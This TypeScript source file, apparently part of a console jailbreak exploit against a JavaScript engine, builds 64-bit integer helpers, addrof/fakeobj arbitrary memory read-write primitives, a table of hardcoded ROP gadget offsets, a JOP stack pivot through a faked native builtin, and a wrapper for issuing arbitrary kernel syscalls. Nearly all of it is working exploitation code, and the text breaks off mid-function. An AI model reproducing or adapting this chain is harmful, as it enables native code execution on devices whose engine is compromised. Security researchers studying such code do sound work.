type BigIntLike = number | boolean | string | BigInt | ArrayLike<number>

class BigInt {
  lo: number
  hi: number
  static View = new DataView(new ArrayBuffer(8))

  constructor ()
  constructor (value: BigIntLike)
  constructor (hi: number, lo: number)
  constructor (valueOrHi?: BigIntLike, lo_?: number) {
    let lo = 0
    let hi = 0

    if (valueOrHi !== undefined) { // valueOrHi is defined
      if (lo_ === undefined) { // one argument
        let value = valueOrHi
        switch (typeof value) {
          case 'boolean':
            lo = value ? 1 : 0
            break
          case 'number':
            if (isNaN(value)) {
              throw new TypeError(`Number ${value} is NaN`)
            }

            if (Number.isInteger(value)) {
              if (!Number.isSafeInteger(value)) {
                throw new RangeError(`Integer ${value} outside safe 53-bit range`)
              }

              lo = value >>> 0
              hi = Math.floor(value / 0x100000000) >>> 0
            } else {
              BigInt.View.setFloat64(0, value, true)

              lo = BigInt.View.getUint32(0, true)
              hi = BigInt.View.getUint32(4, true)
            }

            break
          case 'string':
            if (value.startsWith('0x')) {
              value = value.slice(2)
            }

            if (value.length > 16) {
              throw new RangeError(`String ${value} is out of range !!`)
            }

            while (value.length < 16) {
              value = '0' + value
            }

            for (let i = 0; i < 8; i++) {
              const start = value.length - 2 * (i + 1)
              const end = value.length - 2 * i
              const b = value.slice(start, end)
              BigInt.View.setUint8(i, parseInt(b, 16))
            }

            lo = BigInt.View.getUint32(0, true)
            hi = BigInt.View.getUint32(4, true)

            break
          default:
            if (value instanceof BigInt) {
              lo = value.lo
              hi = value.hi
              break
            }

            throw new TypeError(`Unsupported value ${value} !!`)
        }
      } else { // two arguments
        hi = (valueOrHi as number) >>> 0
        lo = lo_ >>> 0

        if (!Number.isFinite(hi)) {
          throw new RangeError(`hi value ${hi} is not an integer !!`)
        }

        if (!Number.isFinite(lo)) {
          throw new RangeError(`lo value ${lo} is not an integer !!`)
        }
      }
    }

    this.lo = lo
    this.hi = hi
  }

  valueOf () {
    if (this.hi <= 0x1FFFFF) {
      return this.hi * 0x100000000 + this.lo
    }

    BigInt.View.setUint32(0, this.lo, true)
    BigInt.View.setUint32(4, this.hi, true)

    const f = BigInt.View.getFloat64(0, true)
    if (!isNaN(f)) {
      return f
    }

    throw new RangeError(`Unable to convert ${this} to primitive`)
  }

  toString () {
    BigInt.View.setUint32(0, this.lo, true)
    BigInt.View.setUint32(4, this.hi, true)

    let value = '0x'
    for (let i = 7; i >= 0; i--) {
      const c = BigInt.View.getUint8(i).toString(16).toUpperCase()
      value += c.length === 1 ? '0' + c : c
    }

    return value
  }

  getBit (idx: number) {
    if (idx < 0 || idx > 63) {
      throw new RangeError(`Bit ${idx} is out of range !!`)
    }

    return (idx < 32 ? (this.lo >>> idx) : (this.hi >>> (idx - 32))) & 1
  }

  setBit (idx: number, value: 0 | 1 | boolean) {
    if (idx < 0 || idx > 63) {
      throw new RangeError(`Bit ${idx} is out of range !!`)
    }

    if (idx < 32) {
      this.lo = (value ? (this.lo | 1 << idx) : (this.lo & ~(1 << idx))) >>> 0
    } else {
      this.hi = (value ? (this.hi | 1 << (idx - 32)) : (this.hi & ~(1 << (idx - 32)))) >>> 0
    }
  }

  endian () {
    const lo = this.lo
    const hi = this.hi

    this.lo = utils.swap32(hi)
    this.hi = utils.swap32(lo)
  }

  d () {
    const hi_word = this.hi >>> 16
    if (hi_word === 0xFFFF || hi_word === 0xFFFE) {
      throw new RangeError('Integer value cannot be represented by a double')
    }

    BigInt.View.setUint32(0, this.lo, true)
    BigInt.View.setUint32(4, this.hi, true)

    return BigInt.View.getFloat64(0, true)
  }

  jsv () {
    const hi_word = this.hi >>> 16
    if (hi_word === 0x0000 || hi_word === 0xFFFF) {
      throw new RangeError('Integer value cannot be represented by a JSValue')
    }

    return this.sub(new BigInt(0x10000, 0)).d()
  }

  cmp (value: BigIntLike) {
    value = value instanceof BigInt ? value : new BigInt(value)

    if (this.hi > value.hi) {
      return 1
    }

    if (this.hi < value.hi) {
      return -1
    }

    if (this.lo > value.lo) {
      return 1
    }

    if (this.lo < value.lo) {
      return -1
    }

    return 0
  }

  eq (value: BigIntLike) {
    value = value instanceof BigInt ? value : new BigInt(value)

    return this.hi === value.hi && this.lo === value.lo
  }

  neq (value: BigIntLike) {
    value = value instanceof BigInt ? value : new BigInt(value)

    return this.hi !== value.hi || this.lo !== value.lo
  }

  gt (value: BigIntLike) {
    return this.cmp(value) > 0
  }

  gte (value: BigIntLike) {
    return this.cmp(value) >= 0
  }

  lt (value: BigIntLike) {
    return this.cmp(value) < 0
  }

  lte (value: BigIntLike) {
    return this.cmp(value) <= 0
  }

  add (value: BigIntLike) {
    value = value instanceof BigInt ? value : new BigInt(value)

    const lo = this.lo + value.lo
    const c = lo > 0xFFFFFFFF ? 1 : 0
    const hi = this.hi + value.hi + c

    if (hi > 0xFFFFFFFF) {
      throw new RangeError('add overflowed !!')
    }

    return new BigInt(hi, lo)
  }

  sub (value: BigIntLike) {
    value = value instanceof BigInt ? value : new BigInt(value)

    if (this.lt(value)) {
      throw new RangeError('sub underflowed !!')
    }

    const b = this.lo < value.lo ? 1 : 0
    const hi = this.hi - value.hi - b
    const lo = this.lo - value.lo

    return new BigInt(hi, lo)
  }

  mul (value: BigIntLike) {
    value = value instanceof BigInt ? value : new BigInt(value)

    const m00 = Math.imul(this.lo, value.lo)
    const m01 = Math.imul(this.lo, value.hi)
    const m10 = Math.imul(this.hi, value.lo)
    const m11 = Math.imul(this.hi, value.hi)

    const d = m01 + m10

    const lo = m00 + (d << 32)
    const c = lo > 0xFFFFFFFF ? 1 : 0
    const hi = m11 + (d >>> 32) + c

    if (hi > 0xFFFFFFFF) {
      throw new Error('mul overflowed !!')
    }

    return new BigInt(hi, lo)
  }

  divmod (value: BigIntLike) {
    value = value instanceof BigInt ? value : new BigInt(value)

    if (value.eq(new BigInt(0))) {
      throw new Error('Division by zero')
    }

    const q = new BigInt()
    let r = new BigInt()

    for (let i = 63; i >= 0; i--) {
      r = r.shl(1)

      if (this.getBit(i)) {
        r.setBit(0, true)
      }

      if (r.gte(value)) {
        r = r.sub(value)
        q.setBit(i, true)
      }
    }

    return { q, r }
  }

  div (value: BigIntLike) {
    return this.divmod(value).q
  }

  mod (value: BigIntLike) {
    return this.divmod(value).r
  }

  xor (value: BigIntLike) {
    value = value instanceof BigInt ? value : new BigInt(value)

    const lo = (this.lo ^ value.lo) >>> 0
    const hi = (this.hi ^ value.hi) >>> 0

    return new BigInt(hi, lo)
  }

  and (value: BigIntLike) {
    value = value instanceof BigInt ? value : new BigInt(value)

    const lo = (this.lo & value.lo) >>> 0
    const hi = (this.hi & value.hi) >>> 0

    return new BigInt(hi, lo)
  }

  or (value: BigIntLike) {
    value = value instanceof BigInt ? value : new BigInt(value)

    const lo = (this.lo | value.lo) >>> 0
    const hi = (this.hi | value.hi) >>> 0

    return new BigInt(hi, lo)
  }

  not () {
    const lo = ~this.lo >>> 0
    const hi = ~this.hi >>> 0

    return new BigInt(hi, lo)
  }

  shl (count: number) {
    if (count < 0 || count > 63) {
      throw new RangeError(`Shift ${count} bits out of range !!`)
    }

    if (count === 0) {
      return new BigInt(this)
    }

    const lo = count < 32 ? (this.lo << count) >>> 0 : 0
    const hi = count < 32 ? ((this.hi << count) | (this.lo >>> (32 - count))) >>> 0 : (this.lo << (count - 32)) >>> 0

    return new BigInt(hi, lo)
  }

  shr (count: number) {
    if (count < 0 || count > 63) {
      throw new RangeError(`Shift ${count} bits out of range !!`)
    }

    if (count === 0) {
      return new BigInt(this)
    }

    const lo = count < 32 ? ((this.lo >>> count) | (this.hi << (32 - count))) >>> 0 : this.hi >>> (count - 32)
    const hi = count < 32 ? this.hi >>> count : 0

    return new BigInt(hi, lo)
  }
}

declare global {
  interface DataView {
    getBigInt (byteOffset: number, littleEndian?: boolean): BigInt
    setBigInt (byteOffset: number, value: BigIntLike, littleEndian?: boolean): void
  }
}

DataView.prototype.getBigInt = function (byteOffset, littleEndian) {
  littleEndian = (typeof littleEndian === 'undefined') ? false : littleEndian

  const lo = this.getUint32(byteOffset, true)
  const hi = this.getUint32(byteOffset + 4, true)

  return new BigInt(hi, lo)
}

DataView.prototype.setBigInt = function (byteOffset, value, littleEndian) {
  value = (value instanceof BigInt) ? value : new BigInt(value)
  littleEndian = (typeof littleEndian === 'undefined') ? false : littleEndian

  this.setUint32(byteOffset, value.lo, littleEndian)
  this.setUint32(byteOffset + 4, value.hi, littleEndian)
}

const mem = {
  view: function (addr: BigInt) {
    master[4] = addr.lo
    master[5] = addr.hi
    return slave
  },
  addrof: function (obj: unknown) {
    leak_obj.obj = obj
    return this.view(leak_obj_addr).getBigInt(0x10, true)
  },
  fakeobj: function (addr: BigInt) {
    this.view(leak_obj_addr).setBigInt(0x10, addr, true)
    return leak_obj.obj
  },
  copy: function (dst: BigInt, src: BigInt, sz: number) {
    const src_buf = new Uint8Array(sz)
    const dst_buf = new Uint8Array(sz)

    utils.set_backing(src_buf, src)
    utils.set_backing(dst_buf, dst)

    dst_buf.set(src_buf)
  },
  malloc: function (count: number) {
    const buf = new Uint8Array(count)
    return utils.get_backing(buf)
  }
}

const utils = {
  base_addr: function (func_addr: BigInt) {
    const ModuleInfoForUnwind = struct.ModuleInfoForUnwind as StructConstructor<'ModuleInfoForUnwind', [
      { type: 'Uint64', name: 'st_size' },
      { type: 'Uint8', name: 'name[256]' },
      { type: 'Uint64', name: 'eh_frame_hdr_addr' },
      { type: 'Uint64', name: 'eh_frame_addr' },
      { type: 'Uint64', name: 'eh_frame_size' },
      { type: 'Uint64', name: 'seg0_addr' },
      { type: 'Uint64', name: 'seg0_size' }
    ]>
    const module_info_addr = mem.malloc(ModuleInfoForUnwind.sizeof)

    const module_info = new ModuleInfoForUnwind(module_info_addr)

    module_info.st_size = new BigInt(0x130)

    if (!(fn.sceKernelGetModuleInfoForUnwind as (func_addr: BigInt, unk: number, module_info_addr: BigInt) => BigInt)(func_addr, 1, module_info.addr).eq(0)) {
      throw new Error(`Unable to get ${func_addr} base addr`)
    }

    const base_addr = module_info.seg0_addr

    return base_addr
  },
  notify: function (msg: string) {
    const NotificationRequest = struct.NotificationRequest as StructConstructor<'NotificationRequest', [
      { type: 'Int32', name: 'type' },
      { type: 'Int32', name: 'reqId' },
      { type: 'Int32', name: 'priority' },
      { type: 'Int32', name: 'msg_id' },
      { type: 'Int32', name: 'target_id' },
      { type: 'Int32', name: 'user_id' },
      { type: 'Int32', name: 'unk1' },
      { type: 'Int32', name: 'unk2' },
      { type: 'Int32', name: 'app_id' },
      { type: 'Int32', name: 'error_num' },
      { type: 'Int32', name: 'unk3' },
      { type: 'Uint8', name: 'use_icon_image_uri' },
      { type: 'Uint8', name: 'message[1024]' },
      { type: 'Uint8', name: 'icon_uri[1024]' },
      { type: 'Uint8', name: 'unk[1024]' }
    ]>

    const notify_addr = mem.malloc(NotificationRequest.sizeof)

    const notify = new NotificationRequest(notify_addr)

    for (let i = 0; i < msg.length; i++) {
      notify.message[i] = msg.charCodeAt(i) & 0xFF
    }

    notify.message[msg.length] = 0

    const fd = (fn.open as (path: string, flags: number, mode: number) => BigInt)('/dev/notification0', 1, 0)
    if (fd.lt(0)) {
      throw new Error('Unable to open /dev/notification0 !!')
    }

    (fn.write as (fd: BigInt, buf: BigInt, count: number) => BigInt)(fd, notify.addr, NotificationRequest.sizeof);
    (fn.close as (fd: BigInt) => BigInt)(fd)
  },
  str: function (addr: BigInt) {
    const chars = []

    const view = mem.view(addr)
    let term = false
    let offset = 0
    while (!term) {
      const c = view.getUint8(offset)
      if (c === 0) {
        term = true
        break
      }

      chars.push(c)

      offset++
    }

    return String.fromCharCode(...chars)
  },
  cstr: function (str: string) {
    const bytes = new Uint8Array(str.length + 1)

    for (let i = 0; i < str.length; i++) {
      bytes[i] = str.charCodeAt(i) & 0xFF
    }

    bytes[str.length] = 0

    return this.get_backing(bytes)
  },
  get_backing: function (view: TypedArray) {
    return mem.view(mem.addrof(view)).getBigInt(0x10, true)
  },
  set_backing: function (view: TypedArray, addr: BigInt) {
    return mem.view(mem.addrof(view)).setBigInt(0x10, addr, true)
  },
  swap32: function (value: number) {
    return ((value & 0xff) << 24) | ((value & 0xff00) << 8) | ((value >>> 8) & 0xff00) | ((value >>> 24) & 0xff)
  }
}

type ArgType = 'bigint' | 'boolean' | 'number' | 'string'

type ArgTypeToRealType<T extends ArgType> = T extends 'bigint' ? BigInt :
  T extends 'boolean' ? boolean :
    T extends 'number' ? number :
      T extends 'string' ? string :
        never

type Fn<Fns = object> = {
  register<const Name extends string, const Args extends ArgType[], const Return extends ('bigint' | 'boolean' | 'string')> (input: BigInt | number, name: Name, args: Args, ret: Return): asserts this is Fn<Fns & Record<Name, (...args: { [K in keyof Args]: ArgTypeToRealType<Args[K]> }) => ArgTypeToRealType<Return>>>
  unregister<const Name extends string> (name: Name): asserts this is Fn<Omit<Fns, Name>>
  wrapper (this: {
    id?: BigInt
    addr: BigInt
    ret: string
    name: string
    _error?: () => BigInt
    strerror?: (errno: number) => string
  }, ...args: ArgTypeToRealType<ArgType>[]): unknown
} & {
  [key: string]: unknown
} & Fns

const fn: Fn = {
  register: function (input: BigInt | number, name: string, _args: ('bigint' | 'number' | 'boolean' | 'string')[], ret: string) {
    if (name in this) {
      throw new Error(`${name} already registered in fn !!`)
    }

    let id: BigInt | undefined
    let addr: BigInt = new BigInt(0)
    if (input instanceof BigInt) {
      addr = input
    } else if (typeof input === 'number') {
      if (!syscalls.map.has(input)) {
        throw new Error(`Syscall id ${input} not found !!`)
      }

      id = new BigInt(input)
      addr = syscalls.map.get(input)
    }

    var f = this.wrapper.bind({ id, addr, ret, name })

    fn[name] = f
  },
  unregister (name: string) {
    if (!(name in this)) {
      log(`${name} not registered in fn !!`)
      return false
    }

    delete fn[name]

    return true
  },
  wrapper: function (...args: ArgType[]) {
    if (args.length > 6) {
      throw new Error('More than 6 arguments is not supported !!')
    }

    const insts: BigInt[] = []

    const regs = [gadgets.POP_RDI_RET, gadgets.POP_RSI_RET, gadgets.POP_RDX_RET, gadgets.POP_RCX_RET, gadgets.POP_R8_RET, gadgets.POP_R9_JO_RET]

    insts.push(gadgets.POP_RAX_RET)
    insts.push(this.id ?? new BigInt(0))

    for (let i = 0; i < args.length; i++) {
      const reg = regs[i]
      if (reg === undefined) {
        throw new Error(`Unsupported argument index ${i} !!`)
      }
      let value: ArgTypeToRealType<ArgType> = args[i]!

      insts.push(reg)

      switch (typeof value) {
        case 'boolean':
        case 'number':
          value = new BigInt(value)
          break
        case 'string':
          value = utils.cstr(value)
          break
        default:
          if (!((value as object) instanceof BigInt)) {
            throw new Error(`Invalid value at arg ${i}`)
          }
          break
      }

      insts.push(value)
    }

    insts.push(this.addr)

    var store_size = this.ret ? 0x10 : 8
    var store_addr = mem.malloc(store_size)

    if (this.ret) {
      rop.store(insts, store_addr, 1)
    }

    rop.execute(insts, store_addr, store_size)

    var result
    if (this.ret) {
      result = mem.view(store_addr).getBigInt(8, true)

      if (this.id) {
        if (result.eq(-1)) {
          var errno_addr = (this._error!)()
          var errno = mem.view(errno_addr).getUint32(0, true)
          var str = (this.strerror!)(errno)

          throw new Error(`${this.name} returned errno ${errno}: ${str}`)
        }
      }

      switch (this.ret) {
        case 'bigint':
          break
        case 'boolean':
          result = result.eq(1)
          break
        case 'string':
          result = utils.str(result)
          break
        default:
          throw new Error(`Unsupported return type ${this.ret}`)
      }
    }

    return result
  }
}

const gadgets = {
  RET: new BigInt(0),
  POP_R10_RET: new BigInt(0),
  POP_R12_RET: new BigInt(0),
  POP_R14_RET: new BigInt(0),
  POP_R15_RET: new BigInt(0),
  POP_R8_RET: new BigInt(0),
  POP_R9_JO_RET: new BigInt(0),
  POP_RAX_RET: new BigInt(0),
  POP_RBP_RET: new BigInt(0),
  POP_RBX_RET: new BigInt(0),
  POP_RCX_RET: new BigInt(0),
  POP_RDI_RET: new BigInt(0),
  POP_RDX_RET: new BigInt(0),
  POP_RSI_RET: new BigInt(0),
  POP_RSP_RET: new BigInt(0),
  LEAVE_RET: new BigInt(0),
  MOV_RAX_QWORD_PTR_RDI_RET: new BigInt(0),
  MOV_QWORD_PTR_RDI_RAX_RET: new BigInt(0),
  MOV_RDI_QWORD_PTR_RDI_48_MOV_RAX_QWORD_PTR_RDI_JMP_QWORD_PTR_RAX_40: new BigInt(0),
  PUSH_RBP_MOV_RBP_RSP_MOV_RAX_QWORD_PTR_RDI_CALL_QWORD_PTR_RAX_18: new BigInt(0),
  MOV_RDX_QWORD_PTR_RAX_MOV_RAX_QWORD_PTR_RDI_CALL_QWORD_PTR_RAX_10: new BigInt(0),
  PUSH_RDX_CLC_JMP_QWORD_PTR_RAX_NEG_22: new BigInt(0),
  PUSH_RBP_POP_RCX_RET: new BigInt(0),
  MOV_RAX_RCX_RET: new BigInt(0),
  PUSH_RAX_POP_RBP_RET: new BigInt(0),
  init: function (base: BigInt) {
    this.RET = base.add(0x4C)
    this.POP_R10_RET = base.add(0x19E297C)
    this.POP_R12_RET = base.add(0x3F3231)
    this.POP_R14_RET = base.add(0x15BE0A)
    this.POP_R15_RET = base.add(0x93CD7)
    this.POP_R8_RET = base.add(0x19BFF1)
    this.POP_R9_JO_RET = base.add(0x72277C)
    this.POP_RAX_RET = base.add(0x54094)
    this.POP_RBP_RET = base.add(0xC7)
    this.POP_RBX_RET = base.add(0x9D314)
    this.POP_RCX_RET = base.add(0x2C3DF3)
    this.POP_RDI_RET = base.add(0x93CD8)
    this.POP_RDX_RET = base.add(0x3A3DA2)
    this.POP_RSI_RET = base.add(0xCFEFE)
    this.POP_RSP_RET = base.add(0xC89EE)
    this.LEAVE_RET = base.add(0x50C33)
    this.MOV_RAX_QWORD_PTR_RDI_RET = base.add(0x36073)
    this.MOV_QWORD_PTR_RDI_RAX_RET = base.add(0x27FD0)
    this.MOV_RDI_QWORD_PTR_RDI_48_MOV_RAX_QWORD_PTR_RDI_JMP_QWORD_PTR_RAX_40 = base.add(0x46E8F0)
    this.PUSH_RBP_MOV_RBP_RSP_MOV_RAX_QWORD_PTR_RDI_CALL_QWORD_PTR_RAX_18 = base.add(0x3F6F70)
    this.MOV_RDX_QWORD_PTR_RAX_MOV_RAX_QWORD_PTR_RDI_CALL_QWORD_PTR_RAX_10 = base.add(0x18B3B5)
    this.PUSH_RDX_CLC_JMP_QWORD_PTR_RAX_NEG_22 = base.add(0x1E25AA1)
    this.PUSH_RBP_POP_RCX_RET = base.add(0x1737EEE)
    this.MOV_RAX_RCX_RET = base.add(0x41015)
    this.PUSH_RAX_POP_RBP_RET = base.add(0x4E82B9)
  }
}

const rop: {
  idx: number
  base: number
  jop_stack_store: BigInt | undefined
  jop_stack_addr: BigInt | undefined
  stack_addr: BigInt | undefined
  init: (addr: BigInt) => void
  reset: () => void
  fake: ((arg0: unknown, arg1: unknown, arg2: unknown, arg3: unknown) => void) | undefined
  push: (value: BigInt) => void
  execute: (insts: BigInt[], store_addr: BigInt, store_size: number) => void
  fake_builtin: (addr: BigInt) => (arg0: unknown, arg1: unknown, arg2: unknown, arg3: unknown) => void
  store: (insts: BigInt[], addr: BigInt, index: number) => void
  load: (insts: BigInt[], addr: BigInt, index: number) => void
} = {
  idx: 0,
  base: 0x2500,
  jop_stack_store: undefined,
  jop_stack_addr: undefined,
  stack_addr: undefined,
  fake: undefined,
  init: function (addr: BigInt) {
    log('Initiate ROP...')

    gadgets.init(addr)

    this.jop_stack_store = mem.malloc(8)
    this.jop_stack_addr = mem.malloc(0x6A)
    this.stack_addr = mem.malloc(this.base * 2)

    const jop_stack_base_addr = this.jop_stack_addr.add(0x22)

    mem.view(this.jop_stack_addr).setBigInt(0, gadgets.POP_RSP_RET, true)
    mem.view(jop_stack_base_addr).setBigInt(0, this.stack_addr.add(this.base), true)
    mem.view(jop_stack_base_addr).setBigInt(0x10, gadgets.PUSH_RDX_CLC_JMP_QWORD_PTR_RAX_NEG_22, true)
    mem.view(jop_stack_base_addr).setBigInt(0x18, gadgets.MOV_RDX_QWORD_PTR_RAX_MOV_RAX_QWORD_PTR_RDI_CALL_QWORD_PTR_RAX_10, true)
    mem.view(jop_stack_base_addr).setBigInt(0x40, gadgets.PUSH_RBP_MOV_RBP_RSP_MOV_RAX_QWORD_PTR_RDI_CALL_QWORD_PTR_RAX_18, true)

    mem.view(this.jop_stack_store).setBigInt(0, jop_stack_base_addr, true)

    rop.fake = rop.fake_builtin(gadgets.MOV_RDI_QWORD_PTR_RDI_48_MOV_RAX_QWORD_PTR_RDI_JMP_QWORD_PTR_RAX_40)
    rop.reset()

    log('Achieved ROP !!')
  },
  reset: function () {
    this.idx = this.base
  },
  push: function (value: BigInt) {
    if (this.stack_addr === undefined) {
      throw new Error('Please initialize ROP first !!')
    }

    if (this.idx > this.base * 2) {
      throw new Error('Stack full !!')
    }

    mem.view(this.stack_addr).setBigInt(this.idx, value, true)
    this.idx += 8
  },
  execute: function (insts: BigInt[], store_addr: BigInt, store_size: number) {
    if (this.fake === undefined || this.jop_stack_store === undefined) {
      throw new Error('Please initialize ROP first !!')
    }

    if (store_size % 8 !== 0) {
      throw new Error('Invalid store, not aligned by 8 bytes')
    }

    if (store_size < 8) {
      throw new Error('Invalid store, minimal size is 8 to store RSP')
    }

    const header = []

    header.push(gadgets.PUSH_RBP_POP_RCX_RET)
    header.push(gadgets.MOV_RAX_RCX_RET)
    this.store(header, store_addr, 0)

    const footer: BigInt[] = []

    this.load(footer, store_addr, 0)
    footer.push(gadgets.PUSH_RAX_POP_RBP_RET)
    footer.push(gadgets.POP_RAX_RET)
    footer.push(new BigInt(0))
    footer.push(gadgets.LEAVE_RET)

    insts = header.concat(insts).concat(footer)

    for (const inst of insts) {
      this.push(inst)
    }

    this.fake(0, 0, 0, mem.fakeobj(this.jop_stack_store))

    this.reset()
  },
  fake_builtin: function (addr: BigInt) {
    function fake () {}

    const fake_native_executable = mem.malloc(0x60)
    debug(`fake_native_executable: ${fake_native_executable}`)

    mem.copy(fake_native_executable, native_executable, 0x60)
    mem.view(fake_native_executable).setBigInt(0x40, addr, true)

    const fake_addr = mem.addrof(fake)
    debug(`addrof(fake): ${fake_addr}`)

    mem.view(fake_addr).setBigInt(0x10, scope, true)
    mem.view(fake_addr).setBigInt(0x18, fake_native_executable, true)

    fake.executable = fake_native_executable

    return fake
  },
  store (insts: BigInt[], addr: BigInt, index: number) {
    insts.push(gadgets.POP_RDI_RET)
    insts.push(addr.add(index * 8))
    insts.push(gadgets.MOV_QWORD_PTR_RDI_RAX_RET)
  },
  load (insts: BigInt[], addr: BigInt, index: number) {
    insts.push(gadgets.POP_RDI_RET)
    insts.push(addr.add(index * 8))
    insts.push(gadgets.MOV_RAX_QWORD_PTR_RDI_RET)
  }
}

type DefaultNonPointerTypes = `${'Int' | 'Uint'}${8 | 16 | 32 | 64}`
type ToPointer<T extends string | number | symbol> = T extends string | number ? `${T}*` : never
type DefaultPointerTypes = ToPointer<DefaultNonPointerTypes>

type StructName<T> = T extends `${infer Name}[${string}]` ? Name : T
type StructCount<T> = T extends { count: infer C extends number } ? C :
  T extends { name: `${string}[${infer C extends number}]` } ? C :
    1

interface BaseStructField {
  size?: number
  offset?: number
}

interface PointerStructField<StructRef = StructConstructors> extends BaseStructField {
  name: string
  type: DefaultPointerTypes | ToPointer<keyof StructRef>
  pointer?: true
  count?: never
}

interface NonPointerStructFieldWithCountName<StructRef = StructConstructors> extends BaseStructField {
  name: `${string}[${number}]`
  type: DefaultNonPointerTypes | keyof StructRef
  pointer?: false
  count?: number
}

interface NonPointerStructFieldWithCount<StructRef = StructConstructors> extends BaseStructField {
  name: string
  type: DefaultNonPointerTypes | keyof StructRef
  pointer?: false
  count: number
}

interface NonPointerStructField<StructRef = StructConstructors> extends BaseStructField {
  name: string
  type: DefaultNonPointerTypes | keyof StructRef
  pointer?: false
  count?: 1
}

type StructField<StructRef = StructConstructors> = PointerStructField<StructRef> | NonPointerStructFieldWithCount<StructRef> | NonPointerStructFieldWithCountName<StructRef> | NonPointerStructField<StructRef>

type StructReturnType<T extends StructField<StructRef>, StructRef = StructConstructors> =
  StructCount<T> extends (1 | undefined) ? (
    T['pointer'] extends true ? BigInt :
      T['type'] extends 'Int64' ? BigInt :
        T['type'] extends 'Uint64' ? BigInt :
          T['type'] extends DefaultNonPointerTypes ? number :
            T['type'] extends keyof StructRef ? StructRef[T['type']] :
              never
  ) : (
    T['type'] extends 'Int8' ? Int8Array :
      T['type'] extends 'Uint8' ? Uint8Array :
        T['type'] extends 'Int16' ? Int16Array :
          T['type'] extends 'Uint16' ? Uint16Array :
            T['type'] extends 'Int32' ? Int32Array :
              T['type'] extends 'Uint32' ? Uint32Array :
                T['type'] extends 'Int64' ? Int32Array :
                  T['type'] extends 'Uint64' ? Uint32Array :
                    T['type'] extends keyof StructRef ? StructRef[T['type']][] :
                      never
  )

type StructInstance<T extends readonly StructField<StructRef>[], StructRef = StructConstructors> = {
  [K in T[number] as StructName<K['name']>]: StructReturnType<K, StructRef>
} & {
  addr: BigInt
}

interface StructConstructor<Name extends string, T extends readonly StructField<StructRef>[], StructRef = StructConstructors> {
  new (addr: BigInt): StructInstance<T, StructRef>

  readonly tname: Name
  readonly sizeof: number
  readonly fields: T
}

type StructConstructors = Record<string, StructConstructor<string, readonly StructField<StructConstructors>[], StructConstructors>>

type Struct<Structs = object> = {
  register<const Name extends string, const Fields extends readonly StructField<Structs>[]> (name: Name, fields: Fields): asserts this is Struct<Structs & Record<Name, StructConstructor<Name, Fields, Structs>>>
  unregister<const Name extends string> (name: Name): asserts this is Struct<Omit<Structs, Name>>
  parse (fields: readonly StructField<Structs>[]): [number, { type: string; name: string; offset: number; size: number; count: number; pointer: boolean }[]]
  define_property (cls: StructConstructor<string, readonly StructField<StructConstructors>[], StructConstructors>, info: { type: string; name: string; offset: number; size: number; count: number; pointer: boolean }): void
  [key: string]: unknown
} & Structs

const struct: Struct = {
  register: function (name, fields) {
    if (!Array.isArray(fields) || fields.length === 0) {
      throw new Error('Empty fields array !!')
    }

    if (name in this) {
      throw new Error(`${name} already registered in struct !!`)
    }

    const [sizeof, infos] = this.parse(fields)
    const cls = class {
      addr: BigInt

      static tname = name
      static sizeof = sizeof
      static fields = fields

      constructor (addr: BigInt) {
        this.addr = addr
      }
    } as unknown as StructConstructor<string, readonly StructField<StructConstructors>[], StructConstructors>
    this[name] = cls

    for (const info of infos) {
      this.define_property(cls, info)
    }
  },
  unregister: function (name) {
    if (!(name in this)) {
      throw new Error(`${name} not registered in struct !!`)
    }

    delete this[name]

    return true
  },
  parse: function (fields) {
    const infos = []
    let offset = 0
    let struct_alignment = 1
    for (const field of fields) {
      let size = 0
      let alignment = 0
      let pointer = false
      const type = field.type

      const parsed = field.name.match(/^(.+?)(?:\[(\d+)\])?$/)
      if (!parsed) {
        throw new Error(`Invalid field name ${field.name}`)
      }
      const [, name, countStr] = parsed
      if (name === undefined) {
        throw new Error(`Invalid field name ${field.name}`)
      }

      if (type.includes('*')) {
        size = 8
        alignment = 8
        pointer = true
      } else if (type in this) {
        size = (this[type] as StructConstructor<string, readonly StructField<StructConstructors>[], StructConstructors>).sizeof
      } else {
        const bits = Number(type.replace(/\D/g, ''))
        if (bits % 8 !== 0) {
          throw new Error(`Invalid primitive type ${type}`)
        }

        size = bits / 8
        alignment = size
      }

      if (size === 0) {
        throw new Error(`Invalid size for ${field.name} !!`)
      }

      const count = countStr ? Number(countStr) : 1

      if (offset % alignment !== 0) {
        offset += alignment - (offset % alignment)
      }

      infos.push({ type, name, offset, size, count, pointer })

      offset += size * count

      if (alignment > struct_alignment) {
        struct_alignment = alignment
      }
    }

    if (offset % struct_alignment !== 0) {
      offset += struct_alignment - (offset % struct_alignment)
    }

    return [offset, infos]
  },
  define_property: function (cls, info) {
    Object.defineProperty(cls.prototype, info.name, {
      get: function () {
        if (info.count > 1) {
          let addr = this.addr.add(info.offset)
          if (info.pointer) {
            addr = mem.view(addr).getBigInt(0, true)
          }

          let arr: TypedArray | unknown[] = []
          switch (info.type) {
            case 'Int8':
              arr = new Int8Array(info.count)
              utils.set_backing(arr, addr)
              break
            case 'Uint8':
              arr = new Uint8Array(info.count)
              utils.set_backing(arr, addr)
              break
            case 'Int16':
              arr = new Int16Array(info.count)
              utils.set_backing(arr, addr)
              break
            case 'Uint16':
              arr = new Uint16Array(info.count)
              utils.set_backing(arr, addr)
              break
            case 'Int32':
              arr = new Int32Array(info.count)
              utils.set_backing(arr, addr)
              break
            case 'Uint32':
              arr = new Uint32Array(info.count)
              utils.set_backing(arr, addr)
              break
            case 'Int64':
              arr = new Uint32Array(info.count * 2)
              utils.set_backing(arr, addr)
              break
            case 'Uint64':
              arr = new Uint32Array(info.count * 2)
              utils.set_backing(arr, addr)
              break
            default:
              if (info.type in this) {
                for (let i = 0; i < info.count; i++) {
                  arr[i] = new this[info.name](addr.add(i * info.size))
                }
              }

              throw new Error(`Invalid type ${info.type}`)
          }

          return arr
        } else {
          const view = mem.view(this.addr)
          switch (info.type) {
            case 'Int8': return view.getInt8(info.offset)
            case 'Uint8': return view.getUint8(info.offset)
            case 'Int16': return view.getInt16(info.offset, true)
            case 'Uint16': return view.getUint16(info.offset, true)
            case 'Int32': return view.getInt32(info.offset, true)
            case 'Uint32': return view.getUint32(info.offset, true)
            case 'Int64': return view.getBigInt(info.offset, true)
            case 'Uint64': return view.getBigInt(info.offset, true)
            default:
              if (info.pointer) {
                return view.getBigInt(info.offset, true)
              }

              throw new Error(`Invalid type ${info.type}`)
          }
        }
      },
      set: function (value) {
        if (info.count > 1) {
          if (!value.buffer) {
            throw new Error('value is not a typed array')
          }

          if (value.buffer.byteLength !== info.size * info.count) {
            throw new Error(`expected ${info.size * info.count} bytes got ${value.buffer.byteLength}`)
          }

